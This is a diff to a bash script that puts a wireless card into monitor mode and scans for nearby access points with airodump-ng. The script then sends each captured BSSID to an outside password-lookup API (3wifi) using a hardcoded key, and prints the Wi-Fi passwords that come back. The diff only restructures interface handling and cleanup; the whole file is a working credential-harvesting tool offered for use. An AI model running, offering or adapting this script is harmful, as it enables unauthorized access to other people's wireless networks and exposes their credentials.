@@ -1,32 +1,52 @@
 #!/bin/bash
-echo "Enter wlan# "
-sudo iw dev | grep -E "Interface "
+COUNTER=0
 
-read wlan
+	while read -r line ; do
+		DEVS[$COUNTER]=$line
+		COUNTER=$((COUNTER+1))
+	done < <(sudo iw dev | grep -E "Interface " | sed "s/	Interface //")
 
-sudo  airmon-ng start $wlan
 
-sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $wlan'mon' -w /tmp/openwifinetworks --output-forma csv"
+	if [[ ${#DEVS[@]} == 0 ]]; then
+		exit		
+	fi
 
-cat /tmp/openwifinetworks-01.csv | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}' | cut -f1 -d "," > /tmp/bssid.txt
+	if [[ ${#DEVS[@]} == 1 ]]; then
+		wlan=${DEVS[0]}
+	fi
 
+	if [[ ${#DEVS[@]} -gt 1 ]]; then
+		COUNTER=0
+		for i in "${DEVS[@]}";
+		do
+			echo "$((COUNTER+1)). ${DEVS[COUNTER]}"
+			COUNTER=$((COUNTER+1))
+		done
+		read -p "" INTNUM	
+		wlan=${DEVS[$((INTNUM-1))]}	
+	fi
+
+sudo ip link set "$wlan" down && sudo iw "$wlan" set monitor control && sudo ip link set "$wlan" up
+
+sudo airodump-ng -i $wlan -w openwifinetworks --output-forma csv
+
+	sudo rm openwifinetworks-01.ivs
+
+cat openwifinetworks-01.csv | grep  -o '..:..:..:..:..:..' > bssid.txt
+
+	sudo rm openwifinetworks-01.csv
+
+sudo ip link set "$wlan" down && sudo iw "$wlan" set type managed && sudo ip link set "$wlan" up
 
 while read bssid
- do curl "http://3wifi.stascorp.com/api/ajax.php?Query=Find&Key=MHgONUzVP0KK3FGfV0HVEREHLsS6odc3&BSSID=$bssid&Version=0.5" | awk -F'[,]' '{print $2,$3}' >>/tmp/pass.txt
- done < /tmp/bssid.txt 
+ do curl "http://3wifi.stascorp.com/api/ajax.php?Query=Find&Key=MHgONUzVP0KK3FGfV0HVEREHLsS6odc3&BSSID=$bssid&Version=0.5" | awk -F'[,]' '{print $2,$3}' >> pass.txt
+ done < bssid.txt 
 
- 
+ paste bssid.txt pass.txt > pass.log 
 
-paste /tmp/bssid.txt /tmp/pass.txt > /tmp/pass.log 
-
-sudo airmon-ng stop $wlan'mon'
-
+	
+	sudo rm bssid.txt
+	sudo rm pass.txt
 clear
 
-sudo rm /tmp/openwifinetworks-01.csv
-sudo rm /tmp/openwifinetworks-01.ivs
-sudo rm /tmp/bssid.txt
-sudo rm /tmp/pass.txt
-
-cat /tmp/pass.log
-
+cat pass.log
